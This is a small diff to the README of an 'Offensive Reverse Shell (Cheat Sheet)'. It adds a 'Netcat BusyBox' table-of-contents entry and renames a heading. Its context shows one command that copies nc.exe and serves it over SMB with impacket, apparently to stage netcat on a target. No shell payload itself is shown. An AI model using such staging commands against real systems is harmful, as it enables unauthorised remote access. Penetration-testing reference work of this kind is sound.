@@ -11,6 +11,7 @@ Welcome to the **Offensive Reverse Shell (Cheat Sheet)**, a comprehensive reposi
 - [Netcat](#netcat)
   - [Netcat Linux](#netcat-linux)
   - [Netcat Windows](#netcat-windows)
+  - [Netcat BusyBox](#netcat-busybox)
 - [<kbd>BusyBox</kbd>](#busybox)
 - [<kbd>cURL</kbd>](#curl)
 - [<kbd>Wget</kbd>](#wget)
@@ -206,7 +207,7 @@ cp $(locate nc.exe) . && impacket-smbserver a $(pwd) -smb2support
 
 ---
 
-# <kbd>BusyBox</kbd>
+# <kbd>Netcat BusyBox</kbd>
 
 ```sh
 #sh
